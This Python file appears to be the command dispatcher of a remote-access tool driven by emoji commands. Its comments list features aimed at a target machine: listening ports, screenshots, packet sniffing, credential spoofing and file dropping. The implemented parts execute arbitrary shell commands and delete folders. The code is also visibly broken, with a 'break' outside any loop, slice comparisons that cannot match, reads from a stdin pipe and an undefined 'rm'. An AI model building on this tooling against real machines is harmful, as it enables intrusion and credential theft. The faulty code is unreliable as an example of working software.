#!/bin/python3
'''
This file shall contain functions related to executions of commands
1. Execute commands and return their STDOUT and STDERR
2. Return should be in the form of a list/dictionary
3. Feel free to use os/subprocess as required
'''

import emoji
import os
import subprocess

import shutil

from miscellaneous import *

def std_operation(cmd):

	list_app = []
	p = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr = subprocess.PIPE)
	list_app.extend([p.stdin.read(), p.stdout.read(), p.stderr.read()])
	return list_app

def help():
	pass

def cmd(cmd):

	open_port = "\U0001F44C"     # Open port to listen for connection        : ok
	ss = "\U0001F933"            # Take screenshot                           : selfie
	sniff = "\U0001F440"         # To sniff/capture packets on trgt machine  : eyes
	greddy = "\U0001F911"        # To spoof creds from trgt                  : money-mouth face
	drop = "\U0001F4A3"          # Dropping file/folder on trgt              : bomb
	scan = "\U0001F575"          # Scanning networks                         : detective

	door = "\U0001F6AA"          # Exiting                                   : door
	help = "\U0001F914"          # help                                      : thinking face
	file = "\U0001F4DD"          # file making/file                          : memo
	chng_direc = "\U0001F3CE"    # chnging directory                         : racing car
	remove  = "\U0001F6AE"       # removing                                  : litter in bin sign
	folder = "\U0001F4C1"        # folder					 : file folder

	# exiting
	if cmd == door:
		break

	# help section
	elif cmd == help:
		help = help()
		return help

	# creating file
	elif cmd[:10] == file and len(cmd) > 1:

		file = open(cmd[11:], 'w')
		file.close()
		return ""

	# changing directory
	elif cmd[:10] == chng_direc and len(cmd) > 1:

		try:
			os.chdir(cmd[11:])
			return ""

		except Exception as e:
			e = f"{e}: can't move to specified directory"
			return e

	# Removing folder
	elif cmd[:10] == remove and cmd.find(folder) and len(cmd) > 1:

		try:
			pwd = os.getcwd()
			abs_path = pwd+'/'+cmd[22:]
			shutil.rmtree(abs_path)

			return ""
		except Exception as e:
			e = f"{e}: folder can't be removed"
			return e

	# Removing file
	elif cmd[:10] == remove and cmd.find(file) and len(cmd) > 1:

		rm(cmd[22:])

	else:
		std_operation(cmd)
